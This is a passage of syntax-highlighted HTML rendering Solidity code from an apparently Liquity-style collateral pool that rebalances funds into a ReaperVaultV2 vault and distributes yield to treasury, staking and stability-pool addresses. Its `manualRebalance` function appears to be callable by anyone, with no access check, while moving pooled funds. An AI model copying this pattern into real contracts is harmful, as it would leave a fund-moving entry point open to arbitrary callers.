class=\"mtk12\">collAmount</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">manualRebalance</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_simulatedAmountLeavingPool</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_rebalance</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_simulatedAmountLeavingPool</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">struct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">LocalVariables_rebalance</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentAllocated</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ReaperVaultV2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yieldGenerator</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ownedShares</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sharesToAssets</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">profit</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">finalBalance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">percentOfFinalBal</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yieldingPercentage</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">toDeposit</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">toWithdraw</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yieldingAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">finalYieldingAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">netAssetMovement</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">treasurySplit</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stakingSplit</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stabilityPoolSplit</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_rebalance</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amountLeavingPool</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">LocalVariables_rebalance</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// how much has been allocated as per our internal records?</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">currentAllocated</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">yieldingAmount</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// what is the present value of our shares?</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">yieldGenerator</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ReaperVaultV2</span><span class=\"mtk1\">(</span><span class=\"mtk12\">yieldGenerator</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ownedShares</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">yieldGenerator</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sharesToAssets</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">yieldGenerator</span><span class=\"mtk1\">.</span><span class=\"mtk11\">convertToAssets</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ownedShares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// if we have profit that&#39;s more than the threshold, record it for withdrawal and redistribution</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">profit</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sharesToAssets</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sub</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">currentAllocated</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">profit</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">yieldClaimThreshold</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">]) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">profit</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// what % of the final pool balance would the current allocation be?</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">finalBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collAmount</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk11\">sub</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amountLeavingPool</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">percentOfFinalBal</span><span class=\"mtk1\"> =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">finalBalance</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> ? </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\"> : </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">currentAllocated</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mul</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">).</span><span class=\"mtk11\">div</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">finalBalance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// if abs(percentOfFinalBal - yieldingPercentage) &gt; drift, we will need to deposit more or withdraw some</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">yieldingPercentage</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">yieldingPercentage</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">finalYieldingAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">finalBalance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mul</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">yieldingPercentage</span><span class=\"mtk1\">).</span><span class=\"mtk11\">div</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">yieldingAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">yieldingAmount</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">percentOfFinalBal</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">yieldingPercentage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                &amp;&amp; </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">percentOfFinalBal</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sub</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">yieldingPercentage</span><span class=\"mtk1\">) &gt; </span><span class=\"mtk12\">yieldingPercentageDrift</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// we will end up overallocated, withdraw some</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">toWithdraw</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">currentAllocated</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sub</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">finalYieldingAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">yieldingAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">yieldingAmount</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sub</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">toWithdraw</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">yieldingAmount</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">yieldingAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">percentOfFinalBal</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">yieldingPercentage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                &amp;&amp; </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">yieldingPercentage</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sub</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">percentOfFinalBal</span><span class=\"mtk1\">) &gt; </span><span class=\"mtk12\">yieldingPercentageDrift</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// we will end up underallocated, deposit more</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">toDeposit</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">finalYieldingAmount</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sub</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">currentAllocated</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">yieldingAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">yieldingAmount</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">toDeposit</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">yieldingAmount</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">yieldingAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// + means deposit, - means withdraw</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">netAssetMovement</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">toDeposit</span><span class=\"mtk1\">) - </span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">toWithdraw</span><span class=\"mtk1\">) - </span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">profit</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">netAssetMovement</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">yieldGenerator</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">], </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">netAssetMovement</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">ReaperVaultV2</span><span class=\"mtk1\">(</span><span class=\"mtk12\">yieldGenerator</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">netAssetMovement</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">netAssetMovement</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">ReaperVaultV2</span><span class=\"mtk1\">(</span><span class=\"mtk12\">yieldGenerator</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(-</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">netAssetMovement</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// if we recorded profit, recalculate it for precision and distribute</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">profit</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// profit is ultimately (coll at hand) + (coll allocated to yield generator) - (recorded total coll Amount in pool)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">profit</span><span class=\"mtk1\"> =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)).</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">yieldingAmount</span><span class=\"mtk1\">).</span><span class=\"mtk11\">sub</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collAmount</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">profit</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// distribute to treasury, staking pool, and stability pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">treasurySplit</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">profit</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mul</span><span class=\"mtk1\">(</span><span class=\"mtk12\">yieldSplitTreasury</span><span class=\"mtk1\">).</span><span class=\"mtk11\">div</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">treasurySplit</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">treasuryAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">treasurySplit</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stakingSplit</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">profit</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mul</span><span class=\"mtk1\">(</span><span class=\"mtk12\">yieldSplitStaking</span><span class=\"mtk1\">).</span><span class=\"mtk11\">div</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stakingSplit</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lqtyStakingAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stakingSplit</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">vars</span><span 